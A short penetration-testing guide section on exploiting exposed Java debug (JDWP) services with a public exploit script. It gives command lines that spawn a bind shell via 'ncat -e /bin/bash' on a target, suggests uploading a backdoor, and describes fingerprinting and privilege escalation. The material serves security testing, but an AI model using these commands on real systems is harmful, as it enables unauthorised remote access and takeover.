## Exploiting

You can use the python exploit located in [https://github.com/IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)

```bash
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 #Obtain internal data
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --cmd 'ncat -l -p 1337 -e /bin/bash' #Exec something
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ncat -l -p 1337 -e /bin/bash' #Uses java.lang.String.indexOf as breakpoint instead of java.net.ServerSocket.accept
```

I found that the use of `--break-on 'java.lang.String.indexOf'` make the exploit more **stable**. And if you have the change to upload a backdoor to the host and execute it instead of executing a command, the exploit will be even more stable.

Normally this debugger is run on port 8000 and if you establish a TCP connection with the port and send "**JDWP-Handshake**", the server should respond you with the same string.\
Also, you can check this string in the network to find possible JDWP services.

Listing **processes**, if you find the string "**jdwk**" inside a **java process**, probably it has active the \*\*Java Debug Wired Protocol \*\*and you may be able to move laterally or even **escalate privileges** (if executed as root).
